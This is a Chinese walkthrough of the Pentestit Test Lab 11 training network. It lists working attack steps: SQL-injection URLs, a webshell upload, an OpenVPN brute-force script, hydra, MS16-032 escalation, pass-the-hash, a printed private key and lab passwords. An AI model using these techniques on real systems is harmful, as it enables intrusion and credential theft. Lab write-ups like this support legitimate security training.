<span style="color: rgb(44, 63, 81); font-family: &apos;Helvetica Neue&apos;, Arial, &apos;Hiragino Sans GB&apos;, STHeiti, &apos;Microsoft YaHei&apos;, &apos;WenQuanYi Micro Hei&apos;, SimSun, Song, sans-serif; font-size: 16px; line-height: 1.6;">

# TESTLAB11

[TOC]

网络拓扑图：

![网络拓扑图](./1511926938019.png)



## 连接实验室vpn

@[CTF]


连接好实验室vpn之后，`ping 192.168.101.10`，使用浏览器打开`192.168.101.10`：

![](./1511926583955.png)

![Windows连接](./1511926741333.png)


### kali连接vpn方法1

0x01 在kali上安装vpn客户端：

```bash
apt-get install network-manager-openvpn
apt-get install network-manager-openvpn-gnome
apt-get install network-manager-pptp
apt-get install network-manager-pptp-gnome
apt-get install network-manager-strongswan
apt-get install network-manager-vpnc
apt-get install network-manager-vpnc-gnome
```

0x02 然后直接导入`https://lab.pentestit.ru`下载的`.ovpn`文件

### kali连接vpn方法2

0x01 安装openvpn：

```bash
apt-get install openvpn
```

0x02 新建文件夹,将`lab.ovpn`, `pass.txt` 和 `ovpn.sh` 复制到 `/opt/pentestit/`：

```bash
cd /opt && mkdir pentestit
```

> `lab.ovpn`文件信息如下：

> ![ovpn](./1511925706657.png)

> `pass.txt`为https://lab.pentestit.ru/how-to-connect显示的账号和登陆密码。

> `ovpn.sh`为:

```bash
#!/bin/bash
openvpn --config /opt/pentestit/lab.ovpn &```
```

0x03 连接openvpn：

```bash
chmod +x /opt/pentestit/ovpn.sh
/opt/pentestit/ovpn.sh
```

0x04 停止连接：

```bash
killall openvpn
```

### kali连接vpn方法3 

```bash
openvpn lab.pentestit.ru.conf
```

![Alt text](./1511926114934.png)



tEQGbU9pEzGj

### windows连接vpn

0x01 到http://openvpn.net/index.php/open-source/downloads.html 下载[openvpn](http://openvpn.net/index.php/open-source/downloads.html )

0x02 将`lab.ovpn`和`pass.txt`复制到`C:\Program Files\OpenVPN\config`路径下

0x03 使用管理员权限运行openvpn，连接就行

## 攻击

### CRM Token

**0x01 nmap扫描**

```
root@kali:~# service postgresql start

root@kali:~# msfconsole
....

msf > db_status
[*] postgresql connected to msf
msf > db_nmap -sS -sC -sV -v -A 192.168.101.10
...
msf > db_nmap -sS -sC -sV -v -A 192.168.101.11
```

> `-sS`

![Alt text](./1512001683360.png)

![Alt text](./1512001627051.png)

![Alt text](./1512001588370.png)



![Alt text](./1512000399297.png)
![Alt text](./1512000413560.png)
![Alt text](./1512000426995.png)
![Alt text](./1512000465316.png)


**0x02**

![Alt text](./1512000606287.png)

wpscan 

```
wpscan -a "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" -u 192.168.101.10
```

![Alt text](./1512000128660.png)
![Alt text](./1512000215076.png)

![Alt text](./1512001307330.png)


尝试sqlmap注入攻击，一直失败。

```bash
searchsploit "Vtiger CRM 6.3.0"
```

![Alt text](./1512002296745.png)

[vTiger CRM 6.3.0 - Authenticated Remote Code Execution](https://www.exploit-db.com/exploits/38345/)

使用`amdin`账户和` blackstar`的密码登陆crm后台：

![Alt text](./1512006693662.png)

通过`右上角设置—>rm设置->模板—>公司详细信息—>编辑`上传图片[shell](https://github.com/JohnTroony/php-webshells/blob/master/b374k-mini-shell-php.php.php)(https://github.com/JohnTroony/php-webshells/blob/master/b374k-mini-shell-php.php.php)。

![Alt text](./1512021073980.png)

在上传小马的时候，通过burpsuit拦截，更改图片的文件后缀名为`php`，且删除小马代码中的`php`：

![Alt text](./1512021141605.png)


上传成功，然后找到图片路径`http://192.168.101.10:88/test/logo/shell.php`:

![Alt text](./1512020952603.png)


通过shell找到了token,token为`Give_me_all`:

![Alt text](./1512020697693.png)

![CRM站点的ip情况](./1512081248950.png)
![Alt text](./1512081704041.png)

```bash
$dbconfig['db_server'] = 'localhost';
$dbconfig['db_port'] = ':3306';
$dbconfig['db_username'] = 'crmuser';
$dbconfig['db_password'] = 'PJB&*24^2e2';
$dbconfig['db_name'] = 'testlabcrm';
$dbconfig['db_type'] = 'mysqli';
$dbconfig['db_status'] = 'true';
```

本来想做进一步的攻击，但是有waf，就先做其他的了。

### Site TOKEN

看着后台信息的邮箱，立即想到开始扫出的邮箱页面，考虑将管理员邮箱`admin@test.lab`作为账户登陆。将CRM后台管理员信息收集做成字典，尝试得出密码为`darthvader`：

![Alt text](./1512022460798.png)

从邮箱中得到私钥：

![Alt text](./1512024529838.png)


利用私钥登陆:

```bash
root@kali:~/Desktop# chmod 600 officetwo.key 
root@kali:~/Desktop# ssh -i /root/Desktop/officetwo.key -p2222 tech@192.168.101.11
```

![Alt text](./1512024420000.png)

查看ip情况：

```bash
ip addr show
```

查看文件情况，寻找有用的信息：

![查看隐藏文件](./1512066180000.png)


![Alt text](./1512024635531.png)

![Alt text](./1512025314177.png)

查看具有root权限的进程：

```bash
ps aux | grep root
```

![Alt text](./1512064932126.png)

查看

![Alt text](./1512065566386.png)

打印路由:

```bash
netstat -nr
```

![打印路由](./1512065673171.png)

在`/etc/openvpn/`找到了`.conf`文件：

![office-2用户](./1512068918798.png)

知道了账户可能为`Office-2`,openvpn连接的ip为`192.168.101.10` ，端口为`1194`。

查看`/opt/openvpn/auth.txt`，没有权限：

![Alt text](./1512069026741.png)

使用`openvpn --config server.conf`登陆还需要密码，立即进行下一步——找密码。

![Alt text](./1512069536329.png)

然后直接使用`ls -alhR /var/`大概查看一下目录和文件情况，果然有发现。查看敏感信息的文件，找到了openvpn的爆破脚本、字典，再根据上面找到了的`openvpn --config server.conf`文件进行爆破：



![Alt text](./1512071802501.png)

*爆破脚本：*

```bash
#!/bin/bash
# By Galkan 

openvpn_binary_path="/usr/sbin/openvpn"

function brute_force()
{
  	brute_file="`mktemp /tmp/brute_force_openvpn_$USER.XXXXXX`"
	output_file="`mktemp /tmp/brute_force_openvpn_$USER.XXXXXX`"

	rm -f $brute_file $output_file

	user_name="$1"
	password="$2"

	echo "$user_name" > "$brute_file"
	echo "$password" >> "$brute_file"

	$openvpn_binary_path --config $openvpn_config_file --auth-user-pass "$brute_file" > $output_file &
	
	while [ 1 ]
	do
		if [ -f "$output_file" ]
		then
			cat $output_file | grep -q "Options error"
			if [ $? -eq 0 ]
			then
				echo "ERROR: `cat $output_file | grep "Options error"`"
				break
			fi

			cat $output_file | grep -q "SIGTERM\[soft,auth-failure\] received, process exiting" 
			if [ $? -eq 0 ]
			then
				echo "$user_name:$password -> FAILURE"
				break	
			fi

			cat $output_file | grep -q "Initialization Sequence Completed" 
			if [ $? -eq 0 ]
			then
				echo "$user_name:$password -> SUCCESS"
				break	
			fi
		else
			continue
		fi
	done
	
	openvpn_pid="`pidof openvpn`"
	

	rm -f $brute_file $output_file 
}



function main()
{
	dict_file="$1"

	for vpn_file in $openvpn_binary_path $openvpn_config_file $dict_file
	do
		if [ ! -f "$vpn_file" ]
		then
			echo "$vpn_file : Dosyasi Sistemde Bulunamadi !!!"
			exit 3
		fi
	done


	cat $dict_file | while read -r line
	do
		user_name="`echo "$line" | cut -d ":" -f1`"
		password="`echo "$line" | cut -d ":" -f2`"

		result="`brute_force "$user_name" "$password"`"
		echo "$result"

		echo "$result" | grep -Eq "^ERROR"
		if [ $? -eq 0 ]
		then
			break
		fi	
	done
}



if [ ! $# -eq 2 ]
then
	echo "Kullanim: $0 <dict_file> <vpn_config_file>"
	exit 1
else
	dict_file="$1"
	openvpn_config_file="$2"

	main "$dict_file" 
fi
```

不过在`/var/tmp/.6469636d`中找到了`aut.txt`,和刚才爆破结果一样密码是`starswars`：

![Alt text](./1512070950168.png)

连接第二层openvpn,从`192.168.101.0/24`进入了`172.16.0.0`：

![Alt text](./1512072622127.png)

目前进入网络拓扑图：

![Alt text](./1512072794228.png)

使用[nmap高并发的扫描](http://www.lijiejie.com/nmap-fast-scan-large-networks/)方法进行扫描： 

```bash
root@kali:~# nmap -v -sn -PE -n --min-hostgroup 1024 --min-parallelism 1024 -oX nmap_172_output.xml 172.16.0.0/24
```

![172段存活的机器](./1512078083694.png)

使用msf调用nmap模块扫描：

```bash
msf > db_nmap -sS -sC -sV -v -A 172.16.0.10-18
```

![msf中列出服务](./1512079415856.png)

![msf列出主机](./1512079433114.png)

结合网络拓扑图看：

![网络拓扑图](./1512080752833.png)


- **AD**:`172.16.0.10`
- **CRM:**:`172.16.0.12`和`192.168.101.10`
- **CUPS:**`172.16.0.14`
- **ACCESS CONTROL:**`172.16.0.16`和`172.16.0.17`

根据端口扫描情况，还是从web开始着手，即`172.16.0.11`。该站点和之前的`192.168.101.10`的wordpress站点一样的，都有kittycatfish2.2插件，目测内网内没有waf，不像公网上的那个站点一样。尝试sql注入。

猜字段：

```bash
http://172.16.0.11/wp-content/plugins/kittycatfish-2.2/base.css.php?kc_ad=16%20order%20by%203--%20-
```

![Alt text](./1512116084454.png)

报错为3，即字段是`2`。

知道字段之后，利用联合查询。

```bash
http://172.16.0.11/wp-content/plugins/kittycatfish-2.2/base.css.php?kc_ad=16+union+select+0x6b635f61645f637373,%28SELECT%20GROUP_CONCAT%28table_name%29%20FROM%20information_schema.tables%20WHERE%20table_schema=database%28%29%20GROUP%20BY%20table_name%20LIMIT%200,1%29
```

![Alt text](./1512195065290.png)

```
http://172.16.0.11/wp-content/plugins/kittycatfish-2.2/base.css.php?kc_ad=16+union+select+0x6b635f61645f637373,(SELECT%20GROUP_CONCAT(column_name)%20FROM%20information_schema.columns%20WHERE%20table_name=0x746c5f746f6b656e%20GROUP%20BY%20table_name%20LIMIT%200,1)
```

![Alt text](./1512195093599.png)




登陆`192.168.101.11`这台机器，发现其内网还有三台机器，使用扫描器扫描端口：

```bash
tech@tl11-gw-2:~$ nmap -sV -n -Pn 192.168.13.1-3
```


![Alt text](./1512637696380.png)



三台机器都开放了3389端口。


通过ssh对`192.168.13.1`进行端口转发，将3389端口转发到本地的3389端口：

```bash
root@kali:~# ssh -L 3389:192.168.13.1:3389 -p 2222 -i ~/Desktop/officetwo.key tech@192.168.101.11
```

![Alt text](./1512715463471.png)

下载[freerdp](https://github.com/FreeRDP/FreeRDP)（该工具可以通过hash传递连接远程桌面）安装：

```bash
apt-get install freerdp-x11
```

打开3389，连接：

```bash
xfreerdp /v:127.0.0.1 -sec-nla /u:""
```

![Alt text](./1512715662641.png)

登陆失败之后，得到账户为`arm554`,进行爆破：

```bash
root@kali:~# hydra -t 8 -V -l arm554 -P /usr/share/wordlists/rockyou.txt rdp://127.0.0.1
```

![Alt text](./1512716038392.png)

爆破得到密码为`tiger`，使用该密码登陆远程机器：

```bash
rdesktop -u arm554 -r disk:share=/root/Downloads/ 127.0.0.1
```

![Alt text](./1512716933414.png)


利用[ms16_032](https://www.exploit-db.com/exploits/39719/)提权：

```bash
PS C:\Users\arm554\AppData\Local\Temp> powershell -ExecutionPolicy Bypass

PS C:\Users\arm554\AppData\Local\Temp> Import-Module .\39719.ps1

PS C:\Users\arm554\AppData\Local\Temp> Invoke-MS16-032
```

![Alt text](./1512722200207.png)

添加用户：

```bash
C:\Users\arm554\AppData\Local\Temp>net user sb sb /add
The command completed successfully.


C:\Users\arm554\AppData\Local\Temp>net localgroup administrators sb /add
The command completed successfully.
```

![Alt text](./1512722385194.png)

登陆新添加的账户，找到了token：

![Alt text](./1512723064279.png)

### AD Token

下载文件：

![Alt text](./1512725270473.png)

获得一些信息


使用nmap扫描`172.16.0.10`:

```bash
nmap -A -sV -n 172.16.0.10
```

![Alt text](./1512926932598.png)

扫描结果可以看出该IP是AD.

使用msf的信息收集模块进行Kerberos域用户枚举：

```bash
msf > use auxiliary/gather/kerberos_enumusers

msf auxiliary(kerberos_enumusers) > set RHOST 172.16.0.10

msf auxiliary(kerberos_enumusers) > set USER_FILE /root/user.txt

msf auxiliary(kerberos_enumusers) > set DOAMIN test.lab
```

![Alt text](./1512933753800.png)

![Alt text](./1512933785834.png)

`arm554`这个用户存在于`test.lab`这个域。

![arm554的hash](./1512933951020.png)

使用smbclient连接该IP,尝试使用`tiger`尝试连接失败：

```bash
smbclient -L 172.16.0.10 -U arm554
```

![Alt text](./1512934174843.png)


进行hash传递：

```bash
root@kali:~# pth-smbclient --user=arm554 --pw-nt-hash -m smb3 -L 172.16.0.10 \\\\172.16.0.10\\ 6361DEA164EE8FE91FE7B117FBC9CA5E
```

![Alt text](./1512935252882.png)

爆出共享的文件，尝试直接连接到`files`文件夹，然后连接成功：

```bash
root@kali:~# pth-smbclient --user=arm554 --pw-nt-hash -m smb3 \\\\172.16.0.10\\files 6361DEA164EE8FE91FE7B117FBC9CA5E
```

![Alt text](./1512935352871.png)

使用`get token.txt`下载`token.txt`,并查看得到token是`No_more_admins`：

![Alt text](./1512968261223.png)

### CUPS TOKEN

根据信息，尝试通过arp表找子网。就直接访问`172.16.0.14`查找线索。

尝试SQL注入，username：`admin`,password:` admin' or 1=1 --` ，爆出图片:

![Alt text](./1512968841462.png)

将`004e006f005f00700061007000650072`转换成ascii码:

```bash
echo '004e006f005f00700061007000650072' | xxd -r -p
```

得到`No_paper`


### Director Token

继续翻找图片：

![Alt text](./1512969154528.png)

草--根据图片，一个个敲进去：

```bash
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA4CxmKK2/kvV0+srp24bVZm+yYvCz+rvgHHxX1w7F0oD8aUDI
won79K9XpntFDPUvtJRMg9WqK/zKUwLsMQLGWT66PT4GVbQw4Nr56rOrBIuag/qg
o9WcX0AfIyFYFCNz0TnLfRXSDcSQY0CRK8WfKx5c8uP2kudtzAGv5GQCpSjM2uNV
shOu7xmgo/AMUQvPi8kvD/gAme9G8WkTgpVpAwlsthjxQ9fEO6abHHkjbGGec0O8
4T7Bo2nU8bHjr6Jd+dzUAvytblG1yNvGIybAFAsVqUHjbt9wGZgFKr1kA+3ZCbyF
qFZZ37dpZr2grZXwzlCtPUJGuMfCq7N0ZhmcAwIDAQABAoIBAQDCXPx+TJcLXhJ8
164HjlI8LKAoNLZ3sKlRSWYHqmFOcFNpFqh6M5Tmw5hlWf+2imdAVEw7Cegvl0/8
xU3v+I3tFvv22W44pLC0ZGfHXNvsZvYjdAwPwMeBtmDI3sI1Q7/JKikKXP7wvPrL
c1Hq979XbU39sjU5jbqe5N+SUDwS4Tu79L0uXehnqvCSlyIU9joDhvW87DeaLRaQ
wwkKR9gnPtiKebZ73VGParJ42CZlRgfEOvoLWUk+YrhRfZ9r4uva0IHbZ1LhqNcL
k0OlKEDUDzuju0/YwgBSZVSrhkCAnCnipsxQMc4g2aytPOTdKz4BtF+cZV/rXhyM
kSPIeh1xAoGBAPJfcCQWqsq/dwwOC9I9jWj4W9xAFPbaPSq1oGwNr0ugZ/4DZLGe
glGte8iG/Tc1Lb1Ege2dYPRR5OeFhyo8tADPKleFvDBYGN2asf4JirljxrW5F+ON
q5paXqjbaBKk/Z6f08UlwxjSHRHOWqEvYZkm5bAxrufNKBVpwVWHU6eNAoGBAOzH
AryHBdo45qLnzJR87zDftNNrualVmhWu+h+I7zj4hr52gM/TheHL/ODJZCyZU3vt
7ncDjUM91xwh63vkCiByEYk4vTGnmaj9brmndracJ7jwwSUn/YqPj0D3yD0lrpxd
PLn0c1ic5jaoTSWZN748PoPnP+CPvhjQYvxX5OXPAoGALmnEScTlc+nyXCaccOhE
miNlQ+opmZP1PqaFT+vw876F64iu0ayu/AEiwSXIe7f9SE9EKkKG/IJqOUPCvH3f
YoBIdXUwsnlMWbNz/lfJbvMCbG5Detn4UJiZo/BQH7Hht2mX3hr7H1etJWnExTUT
lYZzWahI/C23TVJxKXW+uUkCgYEAnLDOhMit/M3vAxt27UUIXUWNuuPtSmH9yB+1
cq0B8qe1M9HkSKRoUxbVUES2QDVvY/H+/0+gakFAW2OvHJu6f+I87JxZx8RsEcM1
RTMngo0wVFku2FHwnYOHf6z6HE0VknC5QS4eLyQVzVHvS9RraT8g99VPFmLKoE43
U1svJU0CgYAecYtH3ZvIwPA85sTuTkKAGMmvRxzPnQkyjUF9BwN+B1mfL4uZyJVy
VVWhCwXf/h9G3fKzuV0m0Dz6O7r5DqRqs0uCNbxPaS8qWPcRckwV2Y9htMjXLtXU
nOV4UZBbQSZb/AoSFdcCBjonbudkiAxzm0STdiQ92kZNavvfZAjXQw==
-----END RSA PRIVATE KEY-----
```

使用ssh连接：

```bash
root@kali:~# chmod 600 morgan.key 

root@kali:~# ssh -i morgan.key morgan@172.16.0.252
```

![Alt text](./1512970645892.png)

在机器上执行`/sbin/route -nee`，查看路由:

![Alt text](./1512970783649.png)

安装[sshuttle](https://github.com/apenwarr/sshuttle)：`pip install sshuttle`,然后使用sshuttle进行端口转发:

```bash
sshuttle -e "ssh -i morgan.key" -r morgan@172.16.0.252 192.168.10.0/24 192.168.11.0/24 192.168.12.0/24
```

![Alt text](./1512971216269.png)

使用xfreerdp连接`192.168.12.1-3`机器，试出之前找出的密码可在`192.168.12.2`上登陆：

```bash
xfreerdp /u:admin /p:77_GrantedSuperAdmin_77 /v:192.168.12.2
```

登陆进去之后翻找文件，在soft文件夹找到了`nc`和`Intercepter-NG`：

![Alt text](./1513062966698.png)

进行`smart scan`，扫描出三个IP：

![Alt text](./1513063004866.png)

进入DHCP，设置参数，进行嗅探：

![Alt text](./1513067322375.png)
